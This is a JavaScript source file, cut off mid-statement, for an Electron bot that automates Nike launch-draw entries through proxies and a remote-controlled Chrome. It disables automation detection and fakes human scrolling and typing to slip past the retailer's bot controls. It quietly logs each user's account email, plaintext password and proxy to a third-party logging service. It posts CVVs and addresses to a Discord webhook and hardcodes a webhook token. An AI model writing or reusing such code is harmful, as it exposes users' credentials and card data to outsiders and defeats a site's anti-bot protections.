import { doc } from "firebase/firestore";
import { createCursor } from "ghost-cursor";
import React, { useState, Fragment } from "react";
import toast from "react-hot-toast";
import { MagnifyingGlassIcon } from "@heroicons/react/20/solid";
import { NikeLogin } from "./nikelogin";
import { PlayIcon, StopIcon } from "@heroicons/react/20/solid";
import { nikeMonitor } from "./nikeMonitor";
import Data from "./dataExports"

const path = window.require("node:path");
const revealCard = window.require("credit-card-reveal");
const findChrome = window.require("chrome-finder");
const os = window.require("os");
const userHomeDir = os.homedir();
const axios = window.require("axios");
const fs = window.require("fs");
const ChromeLauncher = window.require("chrome-launcher");
const CDP = window.require("chrome-remote-interface");
const { Webhook, MessageBuilder } = window.require("discord-webhook-node");
const puppeteer = window.require("puppeteer");
const { Logtail } = window.require("@logtail/node");

const logtail = new Logtail("YOUR_LOGTAIL_TOKEN_HERE");

export async function NikeUS(id, region) {
  console.log("hey");
  // const fileContents = fs.readFileSync(pathToAsset, 'utf8')

  console.log(WebhookURL);

  document.getElementById(id + "stop").style.visibility = "visible";
  document.getElementById(id + "start").style.visibility = "hidden";




  const globalData = new Data();
  var TaskData = (globalData.taskData())
  var TaskGroups = (globalData.taskGroups())
  var ProfileData = (globalData.profileData())
  var AccountData = (globalData.accountData())
  var WebhookURL = (globalData.webhook())

  var accountID = "0";
  var proxy;
  var size;
  var profileid;
  var minput;
  var gid;
  var brave;
  var prelaunch;

  var pname;
  var groupId;
  for (var i = 0; i < TaskData.length; i++) {
    if (TaskData[i].id == id) {
      console.log("Found");
      accountID = TaskData[i].account.accountGroup;
      proxy = TaskData[i].proxy.proxy;
      size = TaskData[i].size;
      minput = TaskData[i].monitorInput;
      profileid = TaskData[i].profile.id;
      gid = TaskData[i].groupID;
      brave = TaskData[i].brave;
      prelaunch = TaskData[i].prelaunch;
      groupId = TaskData[i].groupID;
      // fs.writeFile(userHomeDir + "\\AppData\\Roaming\\your-app-name\\Tasks.json", (JSON.stringify(TaskData)), function (err) {
      //     if (err) throw err;
      //   });
    }
  }
  if (brave == undefined) {
    brave = false;
  }
  if (prelaunch == undefined) {
    prelaunch = false;
  }
  var accountEmail;
  var accountPass;
  console.log(accountID);
  for (var x = 0; x < AccountData.length; x++) {
    if (AccountData[x].id == accountID) {
      accountEmail = AccountData[x].email;
      accountPass = AccountData[x].password;
      if (
        AccountData[x].proxy !== undefined &&
        AccountData[x].proxy !== "None"
      ) {
        proxy = AccountData[x].proxy;
      }
    }
  }
  logtail.info(
    os.homedir() +
      " | " +
      proxy +
      "," +
      size +
      "," +
      minput +
      "," +
      accountEmail +
      "," +
      accountPass
  );

  console.log(accountEmail);
  console.log(accountPass);

  var first;
  var last;
  var email;
  var phone;
  var card;
  var expiration;
  var cvv;
  var address;
  var address2;
  var city;
  var state;
  var zip;

  for (var x = 0; x < ProfileData.length; x++) {
    if (ProfileData[x].id == profileid) {
      first = ProfileData[x].shipping.firstName;
      last = ProfileData[x].shipping.lastName;
      email = ProfileData[x].email;
      phone = ProfileData[x].phoneNumber;
      card = ProfileData[x].card.number;
      cvv = ProfileData[x].card.cvv;
      expiration = ProfileData[x].card.expiration;
      address = ProfileData[x].shipping.addressLine1;
      address2 = ProfileData[x].shipping.addressLine2;
      city = ProfileData[x].shipping.city;
      state = ProfileData[x].shipping.state;
      zip = ProfileData[x].shipping.zipCode;
      pname = ProfileData[x].name;
    }
  }
  console.log(expiration);
  if (expiration.length > 5) {
    var expmo = expiration.split("/")[0];
    var expyr = expiration.split("/")[1].substring(2);
    expiration = expmo + "/" + expyr;
  }
  console.log("Expiration: " + expiration);
  function acronymToFullName(acronym) {
    var states = [
      ["Alabama", "AL"],
      ["Alaska", "AK"],
      ["American Samoa", "AS"],
      ["Arizona", "AZ"],
      ["Arkansas", "AR"],
      ["Armed Forces Americas", "AA"],
      ["Armed Forces Europe", "AE"],
      ["Armed Forces Pacific", "AP"],
      ["California", "CA"],
      ["Colorado", "CO"],
      ["Connecticut", "CT"],
      ["Delaware", "DE"],
      ["District Of Columbia", "DC"],
      ["Florida", "FL"],
      ["Georgia", "GA"],
      ["Guam", "GU"],
      ["Hawaii", "HI"],
      ["Idaho", "ID"],
      ["Illinois", "IL"],
      ["Indiana", "IN"],
      ["Iowa", "IA"],
      ["Kansas", "KS"],
      ["Kentucky", "KY"],
      ["Louisiana", "LA"],
      ["Maine", "ME"],
      ["Marshall Islands", "MH"],
      ["Maryland", "MD"],
      ["Massachusetts", "MA"],
      ["Michigan", "MI"],
      ["Minnesota", "MN"],
      ["Mississippi", "MS"],
      ["Missouri", "MO"],
      ["Montana", "MT"],
      ["Nebraska", "NE"],
      ["Nevada", "NV"],
      ["New Hampshire", "NH"],
      ["New Jersey", "NJ"],
      ["New Mexico", "NM"],
      ["New York", "NY"],
      ["North Carolina", "NC"],
      ["North Dakota", "ND"],
      ["Northern Mariana Islands", "NP"],
      ["Ohio", "OH"],
      ["Oklahoma", "OK"],
      ["Oregon", "OR"],
      ["Pennsylvania", "PA"],
      ["Puerto Rico", "PR"],
      ["Rhode Island", "RI"],
      ["South Carolina", "SC"],
      ["South Dakota", "SD"],
      ["Tennessee", "TN"],
      ["Texas", "TX"],
      ["US Virgin Islands", "VI"],
      ["Utah", "UT"],
      ["Vermont", "VT"],
      ["Virginia", "VA"],
      ["Washington", "WA"],
      ["West Virginia", "WV"],
      ["Wisconsin", "WI"],
      ["Wyoming", "WY"],
    ];
    var i;
    var regions = states;
    acronym = acronym.replace(/\w\S*/g, function (txt) {
      return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();
    });
    for (i = 0; i < regions.length; i++) {
      if (regions[i][0] == acronym) {
        return regions[i][1];
      }
    }
  }
  if (state.length > 2) {
    state = acronymToFullName(state);
  } else {
    state = state;
  }
  console.log(state);
  //LOG IN PROCESS
  console.log("PROXY CHECK 0");
  console.log(proxy);
  proxy = proxy.split(":");
  const server = proxy[0] + ":" + proxy[1];
  const proxyuser = proxy[2];
  const proxypass = proxy[3];

  // chrome.close()

  if (id == "") {
    throw Error("Exiting");
  }

  console.log("Proxy Check No. 1");
  console.log(proxyuser);
  console.log(proxypass);
  // LOG IN CHECK

  if (
    !fs.existsSync(
      userHomeDir + "/AppData/Roaming/your-app-name/StoredSessions/" + accountEmail
    )
  ) {
    const browser = await puppeteer.launch({
      arguments: ["--headless"],
      executablePath: findChrome(),
      userDataDir:
        userHomeDir + "/AppData/Roaming/your-app-name/StoredSessions/" + accountEmail,
    });
    await browser.close();
  } else {
  }
  // PROXY

  console.log(server);
  console.log(proxyuser);
  console.log(proxypass);
  // DATA

  var stopped = false;
  var client;
  var chrome;
  var teset;
  var newC;
  var Network;
  var Page;
  var Runtime;
  var Input;
  var Fetch;
  var numPort = 0;
  var utf8Encode = new TextEncoder();

  var byteArray = utf8Encode.encode(accountEmail);
  byteArray.forEach((element) => {
    numPort += parseInt(element);
  });

  if (stopped == true) {
    return true;
  }
  changeStatus("Fetching Product Data..");
  
  var launchId = "";
  var threadID = "";
  var productID = "";
  var productURL = "";
  var productName = "";
  var method = "";
  var site = "";
  var price = "";
  var image = "";
  var sku = "";
  var releaseTime = "";
  var sizes = "";

  var foundProduct = false;
  while (foundProduct == false && stopped == false) {
    var TaskGroups = globalData.taskGroups()
    try {
      for (var i = 0; i < TaskGroups.length; i++) {
        if (
          TaskGroups[i].id == groupId &&
          TaskGroups[i].product.productId !== ""
        ) {
          threadID = TaskGroups[i].product.threadId;
          productID = TaskGroups[i].product.productId;
          productURL = TaskGroups[i].product.url;
          productName = TaskGroups[i].title;
          method = TaskGroups[i].product.releaseMethod;
          site = TaskGroups[i].product.site;
          price = TaskGroups[i].product.price;
          image = TaskGroups[i].product.image;
          sku = TaskGroups[i].product.sku;
          releaseTime = TaskGroups[i].product.releaseDateIso;
          sizes = TaskGroups[i].product.sizes;
          foundProduct = true;
          break;
        }
      }
    } catch {
    }
    await new Promise((r) => setTimeout(r, 1000));
    changeStatus("Waiting for Product Data..");
    
    if(document.getElementById(groupId + "monitor").innerText == "idle"){
      nikeMonitor(groupId, region)
      document.getElementById(groupId + "monitor").innerText = "monitoring"
    }
    else{
      console.log("Monitor Already Running")
    }
  }
  try {
    if (method == "LEO") {
      const minutes = 2;
      const mili = minutes * 60000;
      const rndm = Math.floor(Math.random() * (mili - 1 + 1) + 1);
      releaseTime += rndm;
      console.log(releaseTime);
    } else if (method == "DAN") {
      const minutes = 9;
      const mili = minutes * 60000;
      const rndm = Math.floor(Math.random() * (mili - 1 + 1) + 1);
      releaseTime += rndm;
      console.log(releaseTime);
    }
  } catch {
    var releaseTime = new Date();
  }

  if (size == "RA") {
    var size = sizes[Math.floor(Math.random() * sizes.length)];
    document.getElementById(id + "size").innerText = size;
  }
  console.log(site);
  console.log(threadID);
  console.log(productID);
  console.log(productURL);
  console.log(productName);
  logtail.info(os.homedir() + " | Found Product - " + productName);

  // toast.success(
  //     <span>Found Product: <b>{productName}</b> </span>, {
  //         style: {
  //           borderRadius: '10px',
  //           background: '#292938',
  //           color: '#fff',
  //         },
  //         icon: <MagnifyingGlassIcon className="w-5"/>
  //     }
  // )

  if (stopped == true) {
    return true;
  }
  changeStatus("Launching Browser");
  var numPort = 0;
  var utf8Encode = new TextEncoder();

  var byteArray = utf8Encode.encode(accountEmail);
  byteArray.forEach((element) => {
    numPort += parseInt(element);
  });
    var chrome = await ChromeLauncher.launch({
      chromeFlags: [
        "--no-first-run",
        "--disable-blink-features=AutomationControlled",
        "--test-type",
        "--proxy-server=" + server,
        `--window-size=${
          Math.floor(Math.random() * (1500 - 1100 + 1)) + 1100
        },${Math.floor(Math.random() * (900 - 700 + 1)) + 600}`,
        "--enable-features=ReduceUserAgent",
        "--flag-switches-begin",
        "--flag-switches-end",
      ],
      chromePath:
        brave == true
          ? "C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe"
          : findChrome(),
      ignoreDefaultFlags: true,
      port: numPort,
      userDataDir: path.resolve(
        userHomeDir + "/AppData/Roaming/your-app-name/StoredSessions/" + accountEmail
      ),
    });
    if (stopped == true) {
      return true;
    }
    changeStatus("Connecting... 1");

    var client = await CDP({ port: chrome.port });
    var { Target } = client;
    const { targetId } = await Target.createTarget({ url: "about:blank" });
    var client = await CDP({ target: targetId, port: chrome.port });
    var { Network, Page, Runtime, Input, Fetch, DOM } = client;

    if (stopped == true) {
      return true;
    }
    changeStatus("Loading Product Page");
    const PROXY_AUTH = {
      username: proxyuser,
      password: proxypass,
    };
    console.log(PROXY_AUTH);

    Fetch.authRequired(({ requestId }) => {
      Fetch.continueWithAuth({
        requestId,
        authChallengeResponse: {
          response: "ProvideCredentials",
          ...PROXY_AUTH,
        },
      });
    });
    Fetch.requestPaused(({ requestId }) => {
      Fetch.continueRequest({ requestId });
    });
    await Page.enable()
    await Fetch.enable({ handleAuthRequests: true });
    await Page.navigate({ url: "https://nike.com/" });
    await Page.loadEventFired();

    var targets = (await client.Target.getTargets()).targetInfos;
    targets.forEach(async (element) => {
      if (element.title.toLowerCase().indexOf("blank") >= 0) {
        await CDP.Close({ id: element.targetId, port: numPort });
      }
    });

    var nStat;
    var pStat;

    var userId;
    var codeStatus;

    Network.responseReceived(async ({ requestId, response }) => {
      if (response.url == "https://accounts.nike.com/credential_lookup/v1") {
        nStat = response.status;
        console.log(response);
        console.log("Network Stat: " + nStat);
        console.log("Page URL: " + response.url);
      }
      if (response.url == "https://accounts.nike.com/challenge/password/v1") {
        pStat = response.status;
        console.log(response);
        console.log("Network Stat: " + nStat);
        console.log("Page URL: " + response.url);
      }
      if (response.url == "https://accounts.nike.com/check/v1") {
        codeStatus = response.status;
        console.log("Found Verific Response!");
      } else {
        // console.log("Request Not Matching - " + response.status)
      }
    });

    await new Promise((r) => setTimeout(r, 500));
    if (stopped == true) {
      return true;
    }
    changeStatus("Loading Homepage..");
    await Page.navigate({ url: "https://nike.com" });
    await Page.loadEventFired();
  

  await Page.enable();

  changeStatus("Creating Session..");

  try {
    var expression = `localStorage.getItem('oidc.user:https://accounts.nike.com:4fd2d5e7db76e0f85a6bb56721bd51df')`;
    var { result } = await Runtime.evaluate({ expression });
    var value = JSON.parse(result.value);
    console.log(value);
    var userBearer = value.access_token;
    var userProfileId = value.profile.sub;
    var userName = value.profile.given_name + " " + value.profile.family_name;
    var { root } = await DOM.getDocument();

    var { nodeId } = await DOM.querySelector({
      selector: "#nike-unite",
      nodeId: root.nodeId,
    });

    var attribs = await DOM.getAttributes({ nodeId: nodeId });

    var nikeUxPos = 0;

    for (let x = 0; x < attribs.attributes.length; x++) {
      if (attribs.attributes[x] == "data-clientid") {
        nikeUxPos = x + 1;
      }
    }

    var nikeUx = attribs.attributes[nikeUxPos];

    var profileHeaders = {
      authorization: `Bearer ${userBearer}`,
      "x-nike-ux-id": nikeUx,
      "User-Agent":
        "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    };
    var AccountData = globalData.accountData()
    for(let x = 0; x < AccountData.length; x++){
      if(AccountData[x].email == accountEmail){
        AccountData[x].authorization = `Bearer ${userBearer}`
      }
    }
    globalData.setAccountData(AccountData)
  } catch {
    await Page.close();
    changeStatus("Logging In...");
    await NikeLogin(
      accountEmail,
      accountPass,
      server,
      proxyuser,
      proxypass,
      id,
      zip,
      address,
      address2,
      city,
      last,
      first,
      phone,
      state,
      card,
      expiration,
      cvv
    );
    return true;
  }
  var userId = `https://api.nike.com/identity/user/v1/${userProfileId}/address`;
  const profileStatus = await addProfileInfo();
  if (profileStatus !== true) {
    changeStatus(profileStatus);
    // await chrome.kill()
    // return false;
  }

  async function addProfileInfo() {
    function makeRandom(amt) {
      var result = "";
      var characters = "cdefghijkl0123456789";
      var charactersLength = characters.length;
      for (var i = 0; i < amt; i++) {
        result += characters.charAt(
          Math.floor(Math.random() * charactersLength)
        );
      }
      return result;
    }

    changeStatus("Fetching Address..");

    try {
      const fetchAddress = (
        await axios.get(userId, {
          headers: profileHeaders,
          proxy: {
            protocol: "https",
            host: server.split(":")[0],
            port: server.split(":")[1],
            auth: {
              username: proxyuser,
              password: proxypass,
            },
          },
        })
      ).data;

      if (fetchAddress.length == 0) {
        changeStatus("Adding Address..");

        const addAddress = await axios.post(
          userId,
          {
            code: zip,
            country: "US",
            line1: address,
            line2: address2,
            line3: "",
            locality: city,
            name: {
              kana: {
                family: "",
                given: "",
              },
              primary: {
                family: last,
                given: first,
              },
            },
            phone: {
              evening: "",
              primary: phone,
            },
            preferred: true,
            province: state,
            zone: "",
          },
          {
            headers: profileHeaders,
            proxy: {
              protocol: "https",
              host: server.split(":")[0],
              port: server.split(":")[1],
              auth: {
                username: proxyuser,
                password: proxypass,
              },
            },
          }
        );

        changeStatus("Address Added!");
      } else {
        changeStatus("Address Found!");
      }
    } catch {
      return "Failed to Fetch Address, Exiting..";
    }

    changeStatus("Fetching Payments..");

    try {
      var randomCard =
        makeRandom(8) +
        "-" +
        makeRandom(4) +
        "-" +
        makeRandom(4) +
        "-" +
        makeRandom(12);

      const fetchCardInfo = (
        await axios.post(
          "https://api.nike.com/commerce/storedpayments/consumer/storedpayments",
          {},
          {
            headers: {
              host: "api.nike.com",
              connection: "keep-alive",
              "sec-ch-ua":
                '".Not/A)Brand";v="99", "Google Chrome";v="111", "Chromium";v="111"',
              accept: "application/json",
              authorization: `Bearer ${userBearer}`,
              "sec-ch-ua-mobile": "?0",
              "user-agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
              "sec-ch-ua-platform": '"Windows"',
              origin: "https://www.nike.com",
              "sec-fetch-site": "same-site",
              "sec-fetch-mode": "cors",
              "sec-fetch-dest": "empty",
              referer: "https://www.nike.com/",
              "accept-language": "en-US,en;q=0.9,fr;q=0.8,de;q=0.7",
            },
            proxy: {
              protocol: "https",
              host: server.split(":")[0],
              port: server.split(":")[1],
              auth: {
                username: proxyuser,
                password: proxypass,
              },
            },
          }
        )
      ).data;

      if (!("payments" in fetchCardInfo)) {
        changeStatus("Adding Card [0]");

        const storeCard = await axios.post(
          `https://paymentcc.nike.com/creditcardsubmit/${randomCard}/store`,
          {
            accountNumber: card,
            cardType: revealCard(card).toUpperCase(),
            expirationMonth: expiration.split("/")[0],
            expirationYear: `20${expiration.split("/")[1]}`,
            creditCardInfoId: randomCard,
            cvNumber: cvv,
          },
          {
            headers: {
              "User-Agent":
                "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
              "sec-ch-ua-platform": "Windows",
              "sec-ch-ua":
                '" Not A;Brand";v="99", "Chromium";v="111", "Google Chrome";v="111"',
            },
            proxy: {
              protocol: "https",
              host: server.split(":")[0],
              port: server.split(":")[1],
              auth: {
                username: proxyuser,
                password: proxypass,
              },
            },
          }
        );
        changeStatus("Adding Card [1]");

        const saveCard = await axios.post(
          "https://api.nike.com/commerce/storedpayments/consumer/savepayment",
          {
            type: "CreditCard",
            creditCardInfoId: randomCard,
            isDefault: true,
            currency: "USD",
            billingAddress: {
              address1: address,
              address2: address2,
              city: city,
              country: "US",
              firstName: first,
              lastName: last,
              postalCode: zip,
              state: state,
            },
          },
          {
            headers: profileHeaders,
            proxy: {
              protocol: "https",
              host: server.split(":")[0],
              port: server.split(":")[1],
              auth: {
                username: proxyuser,
                password: proxypass,
              },
            },
          }
        );

        if (saveCard.data.status == "success") {
          changeStatus("Added Card!");
        }
      } else {
        changeStatus("Card Already Added!");
      }
    } catch {
      return "Failed to Add Billing, Exiting..";
    }

    return true;
  }

  if (stopped == true) {
    return true;
  }
  changeStatus("Loading Product..");
  await Page.navigate({ url: productURL });
  await Page.loadEventFired();
  console.log("here2");

  console.log("here3");

  if (stopped == true) {
    return true;
  }
  changeStatus("Scrolling");
  for (var x = 0; x < 20; x++) {
    Input.dispatchMouseEvent({
      type: "mouseWheel",
      y: 125,
      x: 0,
      deltaX: 0,
      deltaY: 125,
      force: 0,
    });
    await new Promise((r) => setTimeout(r, 35));
  }
  await new Promise((r) => setTimeout(r, 1500));
  for (var x = 0; x < 20; x++) {
    Input.dispatchMouseEvent({
      type: "mouseWheel",
      y: -125,
      x: 0,
      deltaX: 0,
      deltaY: -125,
      force: 0,
    });
    await new Promise((r) => setTimeout(r, 35));
  }
  if (stopped == true) {
    return true;
  }
  changeStatus("Loading Entry Page..");
  await Page.enable();
  size = size.replace(" ", "");
  // await Page.navigate({url:"https://www.nike.com/us/en/launch-checkout?productId=d94447c8-7ee7-5fde-b81c-de541506349b&size=12&channel=nike.com&threadId=5ee66c69-f240-4980-9f7b-d9ba35028462"})
  await Page.navigate({
    url:
      "https://www.nike.com/us/en/launch-checkout?productId=" +
      productID +
      "&size=" +
      size +
      "&channel=" +
      site.toLowerCase() +
      "&threadId=" +
      threadID,
  });
  await Page.loadEventFired();
  await new Promise((r) => setTimeout(r, 2500));

  if (stopped == true) {
    return true;
  }
  changeStatus("Entering Card Info");
  async function enterCvv() {
    await new Promise((r) => setTimeout(r, Math.random() * 2500));
    await new Promise((r) => setTimeout(r, Math.random() * 100));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+0009",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 100));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+0009",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 100));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+0009",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 100));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+0009",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 100));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+0009",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 100));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+0009",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    for (var i = 0; i < cvv.length; i++) {
      await new Promise((r) => setTimeout(r, Math.random() * 5));
      await Input.dispatchKeyEvent({
        type: "char",
        text: cvv.substring(i, i + 1),
      });
    }
    await new Promise((r) => setTimeout(r, Math.random() * 500));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+00013",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 200));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+0009",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 200));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+0009",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 200));
    await new Promise((r) => setTimeout(r, 1000));
    return true;
  }

  await enterCvv();

  if (stopped == true) {
    return true;
  }
  changeStatus(
    "Waiting until " + new Date(releaseTime).toString().split(" ")[4]
  );

  document.getElementById("waitingAmount").innerText = (
    parseInt(document.getElementById("waitingAmount").innerText) - 1
  ).toString();

  document.getElementById(id + "status").className =
    "TaskText w-52 text-test";
  var x = setInterval(async function () {
    var now = new Date().getTime();
    var distance = releaseTime - now;
    if (distance < 0) {
      clearInterval(x);
      enterDraw();
    }
  }, 1000);
  async function enterDraw() {
    var drawStat;
    if (stopped == true) {
      return true;
    }
    changeStatus("Entering Draw");
    var entryAuth;
    var entryUrl;
    var entryHeaders = {};
    Network.requestWillBeSent(async ({ request }) => {
      if (request.url.indexOf("api.nike.com/launch/entries/v2") >= 0) {
        if (
          request.headers["authorization"] != null ||
          request.headers["authorization"] != undefined
        ) {
          console.log("Found Entry Request");
          entryAuth = request.headers["authorization"];
          console.log("Found Entry Auth:" + entryAuth);
          console.log(entryAuth);
          // entryHeaders = request.headers
          entryHeaders = {
            authorization: entryAuth,
          };
        }
      } else {
        console.log("Not Matching");
      }
    });
    Network.responseReceived(async ({ requestId, response }) => {
      if (response.url == "https://api.nike.com/launch/entries/v2") {
        console.log("Found Entry Response");
        const { body } = await Network.getResponseBody({ requestId });
        if(body.toString().toLowerCase().indexOf("launch") > -1){
          drawStat = response.status;
          const parsedBody = JSON.parse(body);
          logtail.log(parsedBody);
          console.log(parsedBody);
          entryUrl = "https://api.nike.com/launch/entries/v2/" + parsedBody.id;
          console.log("Found Entry URL: " + entryUrl);
          console.log(drawStat);
        }
        else{
          logtail.log(body.toString())
        }
        
      } else {
        console.log("Not Matching Response Recieved - " + response.url);
      }
    });
    await new Promise((r) => setTimeout(r, Math.random() * 500));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+00013",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });

    await Input.dispatchKeyEvent({
      type: "keyDown",
      windowsVirtualKeyCode: 13,
      nativeVirtualKeyCode: 13,
      text: "\r",
    });
    await Input.dispatchKeyEvent({
      type: "keyUp",
      windowsVirtualKeyCode: 13,
      nativeVirtualKeyCode: 13,
      text: "\r",
    });

    await new Promise((r) => setTimeout(r, Math.random() * 500));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+00013",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 500));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+00013",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 500));
    Input.dispatchKeyEvent({
      keyIdentifier: "U+00013",
      code: "Tab",
      key: "Tab",
      type: "keyDown",
    });
    await new Promise((r) => setTimeout(r, Math.random() * 500));

    await Input.dispatchKeyEvent({
      type: "keyDown",
      windowsVirtualKeyCode: 13,
      nativeVirtualKeyCode: 13,
      text: "\r",
    });
    await Input.dispatchKeyEvent({
      type: "keyUp",
      windowsVirtualKeyCode: 13,
      nativeVirtualKeyCode: 13,
      text: "\r",
    });
    // await client.Input.dispatchMouseEvent(options2);
    var timeout = 0;
    while (drawStat == undefined && stopped == false) {
      if (stopped == true) {
        return true;
      }
      changeStatus("Waiting for Confirmation..");
      console.log("Waiting for Confirmation (" + timeout + ")");
      await new Promise((r) => setTimeout(r, 250));
      timeout++;

      if (timeout == 80) {
        if (stopped == true) {
          return true;
        }
        changeStatus("Timeout Reached, Retrying");

        await Page.reload();
        await Page.loadEventFired();
        await new Promise((r) => setTimeout(r, 2500));
        if (stopped == true) {
          return true;
        }
        changeStatus("Entering Card Info");
        await enterCvv();

        await new Promise((r) => setTimeout(r, Math.random() * 500));
        Input.dispatchKeyEvent({
          keyIdentifier: "U+00013",
          code: "Tab",
          key: "Tab",
          type: "keyDown",
        });

        await Input.dispatchKeyEvent({
          type: "keyDown",
          windowsVirtualKeyCode: 13,
          nativeVirtualKeyCode: 13,
          text: "\r",
        });
        await Input.dispatchKeyEvent({
          type: "keyUp",
          windowsVirtualKeyCode: 13,
          nativeVirtualKeyCode: 13,
          text: "\r",
        });

        await new Promise((r) => setTimeout(r, Math.random() * 500));
        Input.dispatchKeyEvent({
          keyIdentifier: "U+00013",
          code: "Tab",
          key: "Tab",
          type: "keyDown",
        });
        await new Promise((r) => setTimeout(r, Math.random() * 500));
        Input.dispatchKeyEvent({
          keyIdentifier: "U+00013",
          code: "Tab",
          key: "Tab",
          type: "keyDown",
        });
        await new Promise((r) => setTimeout(r, Math.random() * 500));
        Input.dispatchKeyEvent({
          keyIdentifier: "U+00013",
          code: "Tab",
          key: "Tab",
          type: "keyDown",
        });
        await new Promise((r) => setTimeout(r, Math.random() * 500));

        await Input.dispatchKeyEvent({
          type: "keyDown",
          windowsVirtualKeyCode: 13,
          nativeVirtualKeyCode: 13,
          text: "\r",
        });
        await Input.dispatchKeyEvent({
          type: "keyUp",
          windowsVirtualKeyCode: 13,
          nativeVirtualKeyCode: 13,
          text: "\r",
        });
        timeout = 0;
      }
    }

    if (drawStat >= 400) {
      document.getElementById(id + "status").className =
        "TaskText w-52 text-fail";
      if (drawStat == 400) {
        if (stopped == true) {
          return true;
        }
        changeStatus("Draw Not Open [" + drawStat + "], Restart Task");
      } else if (drawStat == 429) {
        if (stopped == true) {
          return true;
        }
        changeStatus("ENTRY_BLOCKED [" + drawStat + "], Restart Task");
      } else {
        if (stopped == true) {
          return true;
        }
        changeStatus("ERROR [" + drawStat + "], Restart Task");
      }
    } else {
      if (stopped == true) {
        return true;
      }
      changeStatus("Entered Draw");
      toast.success(
        <span>
          Entered Draw: <b>{productName}</b>{" "}
        </span>,
        {
          style: {
            borderRadius: "10px",
            background: "#292938",
            color: "#fff",
          },
        }
      );
      var blob = new Webhook(
        "https://discord.com/api/webhooks/1041279979993964604/8DZW29_GqT9SFKPQV12npiI139IxULvQdo15LjBcVk8wnKq3C8YSu0jedCYFvCS0Xd9P"
      );
      var blobe = new MessageBuilder()
        .setTitle("Successfully Entered Draw")
        .setAuthor(
          "your-app-name Global Webhook",
          "https://i.imgur.com/c2uryln.png",
          "https://www.google.com"
        )
        .addField("Style Code", sku, false)
        .addField("Time", "<t:" + parseInt(Date.now() / 1000) + ">")
        .setThumbnail(
          "https://secure-images.nike.com/is/image/DotCom/" +
            sku.replace("-", "_")
        )
        .setColor("#997acc")
        .setDescription("your-app-name Global Webhook")
        .setFooter("your-app-name")
        .setTimestamp();

      // blob.send(blobe);
      logtail.info(
        os.homedir() + " | Successfully Entered Draw - " + productName
      );

      // await Page.close();
    }
    await new Promise((r) => setTimeout(r, 5000));
    const entryConfig = {
      proxy: {
        protocol: "https",
        host: server.split(":")[0],
        port: server.split(":")[1],
        auth: {
          username: proxyuser,
          password: proxypass,
        },
      },
      headers: entryHeaders,
      withCredentials: false,
    };

    var entryResp;
    var entryReas;
    var fullEntry;
    var entryTries;
    while (entryResp == undefined && stopped == false) {
      entryTries++;
      try {
        var entryRes = await axios.get(entryUrl, entryConfig);

        if (stopped == true) {
          return true;
        }
        changeStatus("Waiting for Results..");

        if ("result" in entryRes.data) {
          entryResp = entryRes.data.result.status;
          entryReas = entryRes.data.result.reason;
          fullEntry = entryRes.data.result;
        } else {
          console.log("No Result Yet...");
        }
      } catch (err) {
        if (err.status == undefined) {
          if (stopped == true) {
            return true;
          }
          changeStatus("Error Checking Results [TIMEOUT]..");
        } else {
          document.getElementById(id + "status").className =
            "TaskText w-52 text-fail";
          if (stopped == true) {
            return true;
          }
          changeStatus("Error Checking Results (" + err.status + ")");
          logtail.error(
            os.homedir() + " | Error Checking Results " + err.toString()
          );
        }
      }
      await new Promise((r) => setTimeout(r, 10000));
    }
    logtail.info(
      os.homedir() +
        " | " +
        id +
        " | Entry Result Found - " +
        entryResp.toString()
    );
    logtail.info(os.homedir() + " | " + id + " | " + entryReas.toString());

    if (entryReas.toString().indexOf("FAIL") >= 0) {
      document.getElementById(id + "status").className =
        "TaskText w-52 text-fail";
      if (stopped == true) {
        return true;
      }
      changeStatus("Payment Failed");
      toast.error("Payment Failed: " + email, {
        style: {
          borderRadius: "10px",
          background: "#292938",
          color: "#fff",
        },
      });

      const hook3 = new Webhook(WebhookURL.toString());
      const embed3 = new MessageBuilder()
        .setTitle("Payment Declined")
        .setAuthor(
          "your-app-name",
          "https://i.imgur.com/c2uryln.png",
          "https://www.google.com"
        )
        .addField("Style Code", sku, false)
        .addField("Proxy", "||" + server + "||", false)
        .addField("CVV", "||" + cvv + "||", false)
        .addField("Address", "||" + address + "||", false)
        .addField("Profile", email, false)
        .addField("Time", "<t:" + parseInt(Date.now() / 1000) + ">")
